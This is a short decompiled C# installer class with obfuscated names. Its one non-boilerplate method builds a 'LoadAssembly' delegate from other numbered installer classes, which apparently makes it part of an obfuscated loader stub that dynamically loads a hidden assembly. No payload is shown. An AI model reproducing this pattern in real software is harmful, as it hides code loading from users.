using System;
using System.ComponentModel;
using System.Configuration.Install;

namespace dsui;

[RunInstaller(true)]
public class Installer36 : Installer
{
	private IContainer components;

	internal static Delegate Cd()
	{
		return Delegate.CreateDelegate(typeof(Installer23.LoadAssembly), Installer19.Incepe(), Installer9.mhjnu);
	}

	public Installer36()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Component)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
	}
}
